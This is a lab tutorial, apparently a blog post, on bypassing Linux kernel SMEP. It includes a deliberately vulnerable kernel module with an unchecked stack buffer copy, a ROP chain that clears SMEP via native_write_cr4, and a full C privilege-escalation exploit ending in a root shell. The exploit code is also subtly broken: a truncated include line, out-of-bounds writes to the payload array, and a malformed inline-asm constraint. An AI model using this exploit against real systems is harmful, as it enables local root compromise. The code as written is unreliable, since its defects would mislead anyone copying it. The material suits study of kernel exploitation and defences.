+++
categories = ["Kernel","SMEP","Linux"]
date = "2022-12-10"
description = "Linux kernel SMEP bypass technique."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel :: SMEP Bypass"
slug = "linux-kernel-smep-bypass"
type = "post"
+++

## Environment Setup
```sh
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-5.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -cpu kvm64,+smep \
    -append "console=ttyS0 nokaslr quiet"
```

```
~/pwnkernel $ ./launch.sh
```

## Practice Kernel Module
```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

struct proc_dir_entry *proc_entry;

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char data[32];
    return raw_copy_to_user(buf, data, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char data[32];
    return raw_copy_from_user(data, buf, len);
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
```

```
~/ $ cp challenge.c ~/pwnkernel/src/challenge.c 
```

```
# add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4

all: 
    echo $(OBJECTS)
    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules

clean:
    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
```

```
~/pwnkernel $ ./build.sh
...

~/pwnkernel $ ./launch.sh
...

/ # id
uid=0(root) gid=0
/ # insmod ./challenge.ko
```

## Bypassing SMEP Protection
```
/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff8102dab0 T native_write_cr4
```

```
pwndbg> p $cr4
$1 = [ SMEP OSXMMEXCPT OSFXSR PGE MCE PAE PSE ]
pwndbg> p/x $cr4
$2 = 0x1006f0
```

```c
rop_chain[0] = 0xffffffff81001518; // pop rdi; ret
rop_chain[1] = 0x6f0;              // rdi = 0x6f0
rop_chain[2] = 0xffffffff8102dab0; // native_write_cr4
```

## Exploit Development
```c
nclude <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}

void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space((unsigned long)shell);
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[5];
    read(fd, leak, sizeof(unsigned long) * 5);
    return leak[4];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[6];

    payload[4] = canary;
    
    payload[5] = 0xffffffff81001518; // pop rdi; ret
    payload[6] = 0x6f0;              // rdi = 0x6f0
    payload[7] = 0xffffffff8102dab0; // native_write_cr4

    payload[8] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 6);
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
```

```
~/linux-kernel-exp/smep-bypass $ id
uid=1000(ctf) gid=1000 groups=1000
~/linux-kernel-exp/smep-bypass $ ./exploit
[*] canary @ 0xb30ee19bbcd24b00
/home/ctf/linux-kernel-exp/smep-bypass # id
uid=0(root) gid=0
```

